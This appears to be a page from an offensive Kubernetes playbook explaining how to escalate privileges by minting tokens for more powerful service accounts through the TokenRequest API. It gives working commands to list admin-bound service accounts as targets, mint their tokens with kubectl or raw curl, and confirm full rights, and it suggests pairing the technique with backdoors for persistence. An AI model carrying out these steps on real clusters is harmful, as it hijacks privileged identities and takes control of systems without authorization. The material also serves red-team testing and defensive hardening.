---
title: "TokenRequest API: minting tokens for other service accounts"
description: "The TokenRequest API issues a bound token for a service account through the serviceaccounts/token subresource. An identity that can create tokens for a service account more privileged than itself mints that account's token and acts as it, escalating by borrowing the identity of any service account it is allowed to request tokens for."
keywords:
  - tokenrequest
  - serviceaccounts token
  - service account
  - bound token
  - privilege escalation
---

# TokenRequest API

The TokenRequest API mints a short-lived, audience-bound token for a service account, exposed as the `serviceaccounts/token` subresource and used by `kubectl create token`. The escalation is straightforward: if the current identity can create a token for a service account that has more permissions than it does, it mints that account's token and then acts with its rights. This borrows a more powerful identity without touching any binding.

Check what the identity can request:

```bash
kubectl auth can-i create serviceaccounts/token
kubectl auth can-i create serviceaccounts/token --subresource=token -n kube-system
# find privileged service accounts to target (bound to admin-ish roles)
kubectl get clusterrolebindings -o json | python3 -c '
import sys,json
for b in json.load(sys.stdin)["items"]:
    r=b.get("roleRef",{}).get("name","")
    for s in b.get("subjects") or []:
        if s.get("kind")=="ServiceAccount" and ("admin" in r or r=="cluster-admin"):
            print(r, s["namespace"]+"/"+s["name"])'
```

## Mint and use the token

```bash
# mint a token for a powerful service account
kubectl create token <privileged-sa> -n <ns> --duration=24h
# raw API equivalent:
curl -sk -XPOST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
  $APISERVER/api/v1/namespaces/<ns>/serviceaccounts/<privileged-sa>/token \
  -d '{"spec":{"audiences":["https://kubernetes.default.svc"]}}'
# use the returned token as that service account
kubectl --token="<minted>" auth can-i '*' '*'
```

## Exploitation notes

- The gate is `create` on `serviceaccounts/token` for the target account; combined with a service account bound to a powerful role (found via the binding scan above), it is a direct escalation.
- Minted tokens are bound and time-limited, so this is access rather than durable persistence; pair with [CSR approval](csr-approval.md) or an [RBAC backdoor](../persistence/rbac-backdoor.md) for durability.
- This is also the mechanism behind legitimate token discovery; see [Service account and token discovery](../cluster-enumeration/service-account-and-token-discovery.md).

## References

- [Kubernetes: TokenRequest API](https://kubernetes.io/docs/reference/kubernetes-api/authentication-resources/token-request-v1/)
- [Kubernetes: kubectl create token](https://kubernetes.io/docs/reference/kubectl/generated/kubectl_create/kubectl_create_token/)
